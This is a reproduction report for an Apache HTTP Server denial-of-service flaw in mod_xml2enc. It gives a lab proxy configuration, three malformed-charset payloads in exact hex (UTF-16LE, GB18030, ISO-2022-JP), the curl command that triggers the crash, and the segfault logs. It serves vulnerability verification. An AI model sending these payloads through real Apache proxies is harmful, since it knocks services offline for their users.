# CVE-2026-63686 — Manual Verification Report

## Vulnerability Overview

| Field | Detail |
|-------|--------|
| **CVE ID** | CVE-2026-63686 |
| **Type** | NULL Pointer Dereference |
| **Affected Software** | Apache HTTP Server ≤ 2.4.68 |
| **Affected Module** | `mod_xml2enc` (via `mod_proxy_html` filter chain) |
| **Impact** | Denial of Service — Apache worker process crashes (SIGSEGV) |
| **Attack Vector** | Network (malicious backend response) |
| **CVSS** | High — no authentication required, repeated exploitation takes the server offline |

### Apache Configuration (generated by `setup.sh`)

```apache
<VirtualHost *:80>
    ServerName vulnerable.local
    ProxyPass        / http://<host-gateway>:9090/
    ProxyPassReverse / http://<host-gateway>:9090/
    ProxyHTMLEnable  On
    xml2EncDefault   utf-8
    ErrorLog  /var/log/apache2/error.log
    CustomLog /var/log/apache2/access.log combined
    LogLevel  notice
</VirtualHost>
```

Key directives:
- `ProxyPass` forwards requests to the attacker backend running on the host machine.
- `ProxyHTMLEnable On` activates `mod_proxy_html`, which inserts the `mod_xml2enc` filter into the response chain.
- `xml2EncDefault utf-8` tells `mod_xml2enc` to transcode backend responses to UTF-8.

### Attacker (Malicious Backend)

| Component | Detail |
|-----------|--------|
| Runtime | Python 3 (any version) on the host machine |
| Script | `attacker/poison.py` (threaded — handles concurrent requests) |
| Port | 9090 |
| Protocol | HTTP |

The attacker serves HTTP responses with valid `Content-Type` charset headers but **deliberately malformed bodies** that cause the transcoding to fail.

## Payload Definitions

Three payloads target different codepaths in `mod_xml2enc`'s charset transcoding logic:

### Payload 1: UTF-16LE Orphan Byte

| Field | Value |
|-------|-------|
| Path | `/` or `/utf16` |
| Content-Type | `text/html; charset=UTF-16LE` |
| Body (hex) | `3c 00 3e 00 41` |
| Body (decoded) | `<` `>` + orphan byte |
| Size | 5 bytes |

UTF-16LE encodes each character as 2 bytes. The body contains two valid pairs (`3c 00` = `<`, `3e 00` = `>`) followed by a single orphan byte `41`. The transcoder cannot form a complete code unit from the last byte.

### Payload 2: GB18030 Incomplete Multi-Byte

| Field | Value |
|-------|-------|
| Path | `/gb18030` |
| Content-Type | `text/html; charset=GB18030` |
| Body (hex) | `81 40 41` |
| Size | 3 bytes |

In GB18030, byte `81` is a lead byte that requires a specific trail byte to form a valid character. `40` completes the first pair, but `41` is left dangling as an incomplete sequence.

### Payload 3: ISO-2022-JP Dangling Escape

| Field | Value |
|-------|-------|
| Path | `/iso2022` |
| Content-Type | `text/html; charset=ISO-2022-JP` |
| Body (hex) | `1b 24 42 41 41 42` |
| Size | 6 bytes |

The escape sequence `1b 24 42` (ESC $ B) switches the decoder into JIS X 0208 two-byte mode. The remaining bytes `41 41 42` are only 3 bytes — the decoder expects pairs, but the last byte has no partner.

## Running the Tests

### Test 1: Single Crash (Prove the Vulnerability)

This test fires one payload and confirms Apache crashes with a segmentation fault.

**Terminal 1 — Start the VM:**
```bash
vagrant up                           # Windows / Intel Mac
vagrant up --provider=vmware_desktop  # Apple Silicon Mac
```

**Terminal 2 — Start the attacker:**
```bash
python3 attacker/poison.py --port 9090
```

**Terminal 3 — Fire a single payload:**
```bash
curl http://localhost:8080/
```

**Terminal 3 — Check the crash:**
```bash
vagrant ssh -c "sudo tail -5 /var/log/apache2/error.log"
```

**Expected output:**
```
[xml2enc:error] ... AH01445: Failed to convert input; trying it raw
[core:notice]   ... AH00052: child pid XXXX exit signal Segmentation fault (11)
```

One worker died. The server is still up because other workers handle subsequent requests.

## Success Case — Observed Output

### Single Crash (Test 1)

```
[Fri Nov 06 09:27:31.209625 2026] [xml2enc:error] [pid 3130:tid 3136]
    (70008)Partial results are valid but processing is incomplete:
    [client 10.0.2.2:38152] AH01445: Failed to convert input; trying it raw

[Fri Nov 06 09:27:31.330435 2026] [core:notice] [pid 3126:tid 3126]
    AH00052: child pid 3130 exit signal Segmentation fault (11)
```

**Interpretation:**
1. `AH01445` — `mod_xml2enc` failed to transcode the malformed charset bytes via `iconv`.
2. `AH00052 ... Segmentation fault (11)` — `mod_xml2enc` dereferenced a NULL pointer during the fallback path. The OS killed the worker with signal 11 (SIGSEGV).

## Conclusion

CVE-2026-63686 was successfully reproduced. Sending an HTTP response with a valid multi-byte charset header (`charset=UTF-16LE` or `charset=GB18030`) paired with a truncated body through Apache's `mod_proxy_html` + `mod_xml2enc` filter chain causes a NULL pointer dereference that crashes the Apache worker process. Sustained exploitation exhausts the worker pool and results in complete denial of service — 100% of legitimate requests were denied during the flood.
